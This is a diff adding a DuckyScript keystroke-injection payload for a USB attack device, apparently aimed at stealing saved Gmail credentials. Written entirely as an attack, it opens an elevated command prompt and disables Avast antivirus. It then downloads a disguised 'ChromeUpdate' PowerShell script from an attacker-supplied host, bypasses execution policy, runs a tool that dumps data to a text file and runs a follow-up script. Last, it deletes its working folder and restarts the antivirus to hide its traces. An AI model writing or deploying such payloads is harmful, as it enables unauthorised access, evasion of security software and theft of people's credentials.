@@ -1,0 +1,56 @@
+REM Created by Quacked
+REM GMAIL------------------------------------
+DEFAULT_DELAY 4000
+GUI Q
+STRING cmd
+DELAY 500
+CTRL-SHIFT ENTER
+DELAY 500
+TAB
+DELAY 200
+TAB
+DELAY 200
+ENTER
+DELAY 500
+STRING sc stop "Avast! Antivirus"
+DELAY 200
+ENTER
+DELAY 700
+TAB
+DELAY 200
+TAB
+DELAY 200
+ENTER
+DELAY 700
+STRING cd C:\
+DELAY 200
+ENTER
+STRING mkdir chrome & cd chrome & echo (wget '[YOUR_HOST]/ChromeUpdateDownload.ps1' -OutFile ChromeUpdateDownload.ps1) > b.ps1
+DELAY 500
+ENTER
+STRING powershell -ExecutionPolicy ByPass -File b.ps1
+ENTER
+DELAY 500
+STRING powershell -ExecutionPolicy ByPass -File ChromeUpdateDownload.ps1
+ENTER
+DELAY 8000
+STRING update.exe /stext maintenance.txt
+ENTER
+STRING z
+TAB
+TAB
+ENTER
+DELAY 500
+STRING powershell -ExecutionPolicy ByPass ./maintenance.ps1
+ENTER
+DELAY 500
+STRING cd ..
+ENTER
+STRING rmdir /s /q chrome
+ENTER
+DELAY 500
+STRING sc start "Avast! Antivirus"
+ENTER
+DELAY 200
+STRING exit
+ENTER
